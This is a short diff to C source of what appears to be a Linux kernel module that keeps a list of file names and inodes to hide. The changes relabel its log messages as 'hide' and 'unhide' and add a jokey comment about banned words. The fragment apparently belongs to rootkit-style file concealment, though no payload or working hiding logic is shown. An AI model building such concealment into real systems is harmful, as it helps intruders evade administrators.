@@ -16,6 +16,7 @@
 #include <linux/namei.h>
 #include "fs.h"
 #include "lkm.h"
+#include "log.h"
 
 bool fs_kern_path(const char *name, struct path *path) {
     if (!name || !path)
@@ -196,7 +197,10 @@ static int _fs_add_name(const char *names[], bool ro, u64 ino) {
             strncpy(hn->name, (const char*)*s, len);
             hn->ro = ro;
             hn->ino = ino;
-            prinfo("addname '%s'\n", hn->name);
+            /** the gap caused by banned words
+             * is the most fun
+             */
+            prinfo("hide: '%s'\n", hn->name);
             list_add_tail(&hn->list, &names_node);
         }
     }
@@ -224,7 +228,7 @@ bool fs_del_name(const char *names[]) {
             list_for_each_entry_safe(node, node_safe, &names_node, list) {
                 if (node->ro) continue;
                 if (!strcmp(node->name, *s)) {
-                    prinfo("delname '%s'\n", *s);
+                    prinfo("unhide: '%s'\n", *s);
                     list_del(&node->list);
                     if (node->name)
                         kfree(node->name);
